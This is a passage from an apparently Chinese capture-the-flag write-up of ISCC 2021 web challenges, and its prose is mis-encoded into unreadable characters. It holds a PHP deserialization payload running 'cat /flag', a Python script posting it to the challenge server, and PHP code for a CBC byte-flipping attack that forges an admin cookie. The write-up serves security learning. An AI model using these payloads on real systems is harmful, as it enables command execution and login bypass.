/flag&quot;</span>;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ISCC_Upload</span> </span>&#123;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-keyword">new</span> ISCC_Upload(),<br>    <span class="hljs-string">&#x27;b&#x27;</span>=&gt;<span class="hljs-keyword">new</span> ISCC_ResetCMD(),<br>    <span class="hljs-string">&#x27;c&#x27;</span>=&gt;<span class="hljs-keyword">new</span> ISCC_Command(),<br>);<br><span class="hljs-variable">$b</span>=serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210527200514790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åˆ©ç”¨16è¿›åˆ¶ç»•è¿‡,å°†sæ›¿æ¢æˆSï¼Œåœ¨åºåˆ—åŒ–å†…å®¹ä¸­ä½¿ç”¨å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶è¿™ä¸ªå­—ç¬¦ä¸²å°±æ”¯æŒå°†åé¢çš„å­—ç¬¦ä¸²ç”¨16è¿›åˆ¶è¿›è¡Œè¡¨ç¤ºã€‚ä½¿ç”¨urlç¼–ç ä¸€ä¸‹ï¼Œç„¶åæ›¿æ¢så³å¯ã€‚</p><p>é‡æ–°æ„é€ POPé“¾:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>class ISCC_Command &#123;<br><br>&#125;<br>class ISCC_ResetCMD &#123;<br><br>    protected $new_cmd = <span class="hljs-string">&quot;cat /flag&quot;</span>;<br><br>&#125;<br>class ISCC_Upload &#123;<br>&#125;<br>$a=array(<br>    &#x27;a&#x27;=&gt;new ISCC_Upload(),<br>    &#x27;b&#x27;=&gt;new ISCC_ResetCMD(),<br>    &#x27;c&#x27;=&gt;new ISCC_Command(),<br>);<br>$b=urlencode(serialize($a));<br>$b=str_replace(<span class="hljs-string">&quot;s&quot;</span>,<span class="hljs-string">&quot;S&quot;</span>,$b);<br>$b=str_replace(<span class="hljs-string">&quot;%2A&quot;</span>,<span class="hljs-string">&#x27;\2a&#x27;</span>,$b);<br>echo $b;<br></code></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>BS%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ISCC_Upload%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>DS%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>b%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ISCC_ReSetCMD%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>BS%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>\<span class="hljs-number">2</span>a%<span class="hljs-number">00</span>new_cmd%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BS%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cat+%<span class="hljs-number">2</span>Fflag%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>DS%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>c%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A12%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ISCC_Command%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>é€šè¿‡pythonè„šæœ¬ä¸Šä¼ ï¼Œæ³¨æ„å›¾ç‰‡ä¸èƒ½å¤ªå¤§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://39.96.91.106:7050/&quot;</span><br><br>files=&#123;<br>    <span class="hljs-string">&#x27;iscc_file&#x27;</span>:(<span class="hljs-string">&quot;b&quot;</span>,<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;atkx.jpg&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)),<br>    <span class="hljs-string">&quot;_SESSION&quot;</span>:(<span class="hljs-string">&quot;isccIsCciScc1scc&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>)<br>&#125;<br>headers=&#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&quot;XDEBUG_SESSION=PHPSTORM&quot;</span><br>&#125;<br>r=requests.post(url=url+<span class="hljs-string">&quot;??=O%3A11%3A%22ISCC_Upload%22%3A1%3A%7BS%3A1%3A%22a%22%3BO%3A13%3A%22ISCC_ReSetCMD%22%3A2%3A%7BS%3A10%3A%22%00%5C2a%00new_cmd%22%3BS%3A9%3A%22cat+%2Fflag%22%3BS%3A1%3A%22b%22%3BO%3A12%3A%22ISCC_Command%22%3A0%3A%7B%7D%7D%7D&quot;</span>,files=files,headers=headers)<br><br>print(r.text)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210505151511508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="ISCCå®¢æœä¸€å·å†²å†²å†²ï¼ˆäºŒï¼‰"><a href="#ISCCå®¢æœä¸€å·å†²å†²å†²ï¼ˆäºŒï¼‰" class="headerlink" title="ISCCå®¢æœä¸€å·å†²å†²å†²ï¼ˆäºŒï¼‰"></a>ISCCå®¢æœä¸€å·å†²å†²å†²ï¼ˆäºŒï¼‰</h2><blockquote><p>ç»è¿‡æ¿€çƒˆçš„ç«äº‰ï¼Œå®¢æœä¸€å·ç»ˆäºé€šè¿‡è‡ªå·±çš„åŠªåŠ›ï¼ˆé€‰æ‰‹çš„å¸®åŠ©ï¼‰ï¼Œä¿ä½äº†è‡ªå·±çš„é¥­ç¢—ï¼ˆè·å¾—äº†å®¢æœçš„å¯†ç ï¼‰ï¼Œå¯å½“ä»–æ‰“å¼€å®¢æœç™»å½•çª—å£ï¼Œå´å‘ç°æ€ä¹ˆä¹Ÿç™»ä¸ä¸Šå»äº†ã€‚<br>ä½ èƒ½å¸®ä»–çœ‹çœ‹æ€ä¹ˆå›äº‹å—ï¼Ÿ é¢˜ç›®å…¥å£ï¼š<a href="http://39.96.91.106:8210/">http://39.96.91.106:8210/</a> Flagæ ¼å¼ï¼šiscc{XXX}</p></blockquote><p>æŸ¥çœ‹æºç ï¼Œçœ‹åˆ°login.bmpï¼Œä¸‹è½½</p><p>è“è‰²é€šé“æœ€ä½ä½æœ‰å¼‚å¸¸ï¼Œå¦å­˜ä¸ºlogin.html<br><img src="https://img-blog.csdnimg.cn/20210511231815173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æŸ¥çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>define(<span class="hljs-string">&quot;SECRET_KEY&quot;</span>, <span class="hljs-string">&#x27;101010031231243214&#x27;</span>);<br>define(<span class="hljs-string">&quot;METHOD&quot;</span>, <span class="hljs-string">&quot;aes-128-cbc&quot;</span>);<br>session_start();<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_random_iv</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$random_iv</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-variable">$random_iv</span>.=chr(rand(<span class="hljs-number">1</span>,<span class="hljs-number">255</span>));<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$random_iv</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$info</span></span>)</span>&#123;<br>    <span class="hljs-variable">$iv</span> = get_random_iv();<br>    <span class="hljs-variable">$plain</span> = serialize(<span class="hljs-variable">$info</span>);<br>    <span class="hljs-variable">$cipher</span> = openssl_encrypt(<span class="hljs-variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>);<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    setcookie(<span class="hljs-string">&quot;iv&quot;</span>, base64_encode(<span class="hljs-variable">$iv</span>));<br>    setcookie(<span class="hljs-string">&quot;cipher&quot;</span>, base64_encode(<span class="hljs-variable">$cipher</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_login</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cipher&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;iv&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$cipher</span> = base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;cipher&#x27;</span>]);<br>        <span class="hljs-variable">$iv</span> = base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;iv&quot;</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$plain</span> = openssl_decrypt(<span class="hljs-variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>))&#123;<br>            <span class="hljs-variable">$info</span> = unserialize(<span class="hljs-variable">$plain</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;base64_decode(&#x27;&quot;</span>.base64_encode(<span class="hljs-variable">$plain</span>).<span class="hljs-string">&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;</span>);<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ERROR!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_homepage</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]===<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;password&quot;</span>]=== password)<br>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Hello admin&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Flag is &#x27;</span>.flag.<span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;<br>    &#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;password&quot;</span>] == password)<br>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;hello &#x27;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;You can\&#x27;t see flag&lt;/p&gt;&#x27;</span>;<br>    &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p&gt;Sorry,password is incorrect&lt;/p&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$info</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$username</span>,<span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-variable">$password</span>);<br>        login(<span class="hljs-variable">$info</span>);<br>        show_homepage();<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>]))&#123;<br>        check_login();<br>        show_homepage();<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;body class=&quot;login-body&quot;&gt;</span><br><span class="hljs-string">                &lt;div id=&quot;wrapper&quot; style = &quot;width:800px; height:200px; overflow:hidden;&quot;&gt;</span><br><span class="hljs-string">                    &lt;img class=&quot;img1&quot; src=&quot;login.bmp&quot;  alt=&quot;login&quot; /&gt;</span><br><span class="hljs-string">                &lt;/div&gt;</span><br><span class="hljs-string">            &lt;/body&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é˜…è¯»æºä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œåªæœ‰adminç”¨æˆ·æ‰èƒ½è¯»å–flagï¼Œä½†æ˜¯adminç”¨æˆ·åˆä¸å…è®¸ç™»å½•ã€‚è™½ç„¶ç›¸äº’çŸ›ç›¾ï¼Œç”±äºé¢˜ç›®ç”¨åˆ°äº†aesçš„cbcæ¨¡å¼åŠ å¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨cbcå­—èŠ‚ç¿»è½¬æ”»å‡»æ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„æ˜æ–‡ã€‚</p><p><strong>Bugku Login4</strong>åŸé¢˜ï¼Œè€ƒæŸ¥CBCå­—èŠ‚ç¿»è½¬æ”»å‡»</p><p>è¿™æ˜¯ç»„åˆé¢˜,çŒœæµ‹å¯†ç æ˜¯ï¼ˆä¸€ï¼‰çš„flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">POST<br>username=admix&amp;password=<span class="hljs-number">1</span>SCC_2o2l_KeFuu&amp;submit=Login<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210513123828790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é¢˜ç›®å°†ç”¨æˆ·åå¯†ç ä¼ å…¥æ•°ç»„å¹¶åºåˆ—åŒ–å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admil&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;1SCC_2o2l_KeFuu&quot;</span>;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿›è¡ŒaesåŠ å¯†ï¼Œå¹¶å°†å¾—åˆ°çš„cipherå’Œivè¿›è¡Œbase64ç¼–ç æ”¾å…¥cookieä¸­(cookieå¯¹äºæ”»å‡»è€…æ¥è¯´å¯æ§ï¼Œæ‰€ä»¥å­˜åœ¨cbcå­—èŠ‚ç¿»è½¬æ”»å‡»)</p><p>æ˜æ–‡åŠ å¯†æ—¶åˆ†ç»„ä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;userna</span><br><span class="hljs-string">me&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admil&quot;</span>;<br>s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s<br>:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;1SCC_2o2l_K</span><br><span class="hljs-string">eFuu&quot;</span>;&#125;ã€€<br></code></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬åªéœ€è¦å°†â€xâ€å­—èŠ‚ç¿»è½¬ä¸ºâ€nâ€å³å¯å¾—åˆ°flagã€‚</p><p>æ ¹æ®æˆ‘ä»¬å¾—åˆ°çš„å…³ç³»ï¼Œå·²çŸ¥åªéœ€ä¿®æ”¹å‰ä¸€ç»„å¯†æ–‡å³å¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$newcipher</span>[<span class="hljs-number">13</span>]=chr(ord(<span class="hljs-number">13</span>) ^ ord(â€˜xâ€™) ^ ord(â€˜nâ€™))<br></code></pre></td></tr></table></figure><p>è¿™æ—¶æˆ‘ä»¬å°±ä¼šå¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;1SCC_2o2l_KeFuu&quot;</span>;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ç”±äºå‰ä¸€ç»„å¯†æ–‡è¢«ä¿®æ”¹äº† æ‰€ä»¥å‰ä¸€ç»„çš„æ˜æ–‡ä¼šå‡ºç°ä¹±ç ï¼Œå› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬å†ç”Ÿæˆæ–°çš„ivå°†å‰ä¸€ç»„æ˜æ–‡æ”¹å›a:2:{s:8:â€userna å³å¯å¾—åˆ°flagã€‚</p><p>ä¸‹é¢å¼€å§‹æ“ä½œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-comment">#è®¡ç®—cipher</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">æ˜æ–‡1ï¼ša:2:&#123;s:8:&quot;userna//r</span><br><span class="hljs-comment">æ˜æ–‡2ï¼šme&quot;;s:5:&quot;admix&quot;;//lå­—æ¯åœ¨ç¬¬14ä¸ªå­—èŠ‚</span><br><span class="hljs-comment">æ˜æ–‡3ï¼šs:8:&quot;password&quot;;s</span><br><span class="hljs-comment">æ˜æ–‡4ï¼š:3:&quot;123&quot;;&#125;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-variable">$cipher</span> = base64_decode(urldecode(<span class="hljs-string">&#x27;y2x2UEGxPieluLPfmaOe7HLmJGhUASZGr4AV8o38wLK9LbccTHd125gfvWZpb6lr3T0He7kJ3t7b%2F9JXPj%2FmCm17%2BVl6eIuWs0BqoaXVDL8%3D&#x27;</span>));<br><span class="hljs-variable">$temp</span> = <span class="hljs-variable">$cipher</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">è®¾å¯†æ–‡1[13]=A,è§£å¯†(å¯†æ–‡2)[13]=B,æ˜æ–‡2[13]=C,</span><br><span class="hljs-comment">å°†Aä¿®æ”¹ä¸ºA ^ C,åˆ™:</span><br><span class="hljs-comment">A ^ B = A ^ C ^ B = B ^ B = 0 = C</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//A  C X</span><br><span class="hljs-variable">$cipher</span>[<span class="hljs-number">13</span>] = chr(ord(<span class="hljs-variable">$cipher</span>[<span class="hljs-number">13</span>]) ^ ord(<span class="hljs-string">&#x27;x&#x27;</span>) ^ ord(<span class="hljs-string">&#x27;n&#x27;</span>));<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(<span class="hljs-variable">$cipher</span>));<br><br><span class="hljs-comment">#Set-Cookie: iv=UlaTx7%2Bd%2B3R0%2BQG0wM0t%2BQ%3D%3D</span><br><span class="hljs-comment">#Set-Cookie: cipher=y2x2UEGxPieluLPfmaOe7HLmJGhUASZGr4AV8o38wLK9LbccTHd125gfvWZpb6lr3T0He7kJ3t7b%2F9JXPj%2FmCm17%2BVl6eIuWs0BqoaXVDL8%3D</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">y2x2UEGxPieluLPfmbWe7HLmJGhUASZGr4AV8o38wLK9LbccTHd125gfvWZpb6lr3T0He7kJ3t7b%<span class="hljs-number">2</span>F9JXPj%<span class="hljs-number">2</span>FmCm17%<span class="hljs-number">2</span>BVl6eIuWs0BqoaXVDL8%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæç¤ºååºåˆ—åŒ–å¤±è´¥äº†<br><img src="https://img-blog.csdnimg.cn/20210513124019323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‡æ–°è®¡ç®—vi</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#è®¡ç®—iv</span><br><span class="hljs-variable">$res</span> = base64_decode(<span class="hljs-string">&#x27;udWanuvQSROPYCexu0Urn21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiIxU0NDXzJvMmxfS2VGdXUiO30=&#x27;</span>);<span class="hljs-comment">//è¿™é‡Œæ”¾burpæ”¾å›çš„base64æ•°æ®</span><br><span class="hljs-variable">$iv</span> = base64_decode(urldecode(<span class="hljs-string">&#x27;UlaTx7%2Bd%2B3R0%2BQG0wM0t%2BQ%3D%3D&#x27;</span>)); <span class="hljs-comment">//è¿™é‡Œæ”¾cookieä¸­çš„iv  iv=kCoJjjQMy%2BIQATaagMVpbw%3D%3D;</span><br><span class="hljs-variable">$plaintext</span> = <span class="hljs-string">&#x27;a:2:&#123;s:8:&quot;userna&#x27;</span>;<br><span class="hljs-variable">$new_iv</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">16</span>; <span class="hljs-variable">$i</span> ++)&#123;<br><span 